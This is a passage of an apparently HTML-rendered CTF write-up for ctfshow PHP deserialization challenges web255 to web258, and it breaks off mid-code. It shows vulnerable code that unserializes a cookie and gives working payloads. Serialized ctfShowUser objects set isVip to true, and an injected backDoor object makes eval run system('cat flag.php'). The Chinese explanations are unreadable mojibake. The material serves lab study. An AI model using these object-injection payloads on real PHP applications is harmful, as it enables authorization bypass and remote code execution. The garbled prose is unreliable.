punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ä¸ä¸Šé¢˜ä¸åŒçš„æ˜¯è¿™æ¬¡çš„<code>$user</code>æ˜¯ç”±cookieçš„userå˜é‡ååºåˆ—åŒ–å¾—åˆ°çš„ï¼Œè€ƒå¯Ÿäº†åŸºæœ¬çš„ååºåˆ—åŒ–</p><p>è¦æ±‚ cookie ä¸­ user å€¼ä¸ºä¸€ä¸ªåºåˆ—åŒ–çš„ ctfshowUser å¯¹è±¡ï¼Œå±æ€§ isVip å€¼ä¸º trueï¼Œusername å’Œ password å’Œ GET å‚æ•°è·å–çš„ä¸€è‡´ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxxCookie<span class="token punctuation">:</span> <span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">//urlencode O: 11:"ctfShowUser":3:&#123;s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";s:5:"isVip";b:1;&#125;</span></code></pre><h4 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>**vipOneKeyGetFlag()**æ–¹æ³•è¦æ±‚usernameå’Œpasswordä¸ä¸€æ ·ï¼Œä¼ å…¥çš„ç±»æ˜¯è‡ªå·±å¯æ§çš„ï¼Œæ”¹å°±è¡Œäº†å‘—</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxCookie<span class="token punctuation">:</span> <span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">//urlencode O: 11:"ctfShowUser":3:&#123;s:8:"username";s:6:"xxxxxx";s:8:"password";s:5:"xxxxx";s:5:"isVip";b:1;&#125;</span></code></pre><h4 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ä»<code>backDoor</code>çš„evalå‡½æ•°å…¥æ‰‹ï¼Œä¿®æ”¹<code>ctfShowUser</code>çš„classå˜é‡è§¦å‘backDoorç±»ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'backDoor'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system("cat flag.php");'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxxCookie<span class="token punctuation">:</span> user<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A21<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A21<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>class<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>backDoor<span class="token operator">%</span><span class="token number">00</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A23<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">22</span>cat<span class="token operator">+</span>flag<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">// urlencode </span><span class="token comment">// O:11:"ctfShowUser":4:&#123;s:21:"ctfShowUserusername";s:6:"xxxxxx";s:21:"ctfShowUserpassword";s:6:"xxxxxx";s:18:"ctfShowUserisVip";b:1;s:18:"ctfShowUserclass";O:8:"backDoor":1:&#123;s:14:"backDoorcode";s:23:"system("cat flag.php");";&#125;&#125;</span></code></pre><h4 id="web258-ç»•è¿‡æ­£åˆ™"><a href="#web258-ç»•è¿‡æ­£åˆ™" class="headerlink" title="web258(+ç»•è¿‡æ­£åˆ™)"></a>web258(+ç»•è¿‡æ­£åˆ™)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">info</span><span 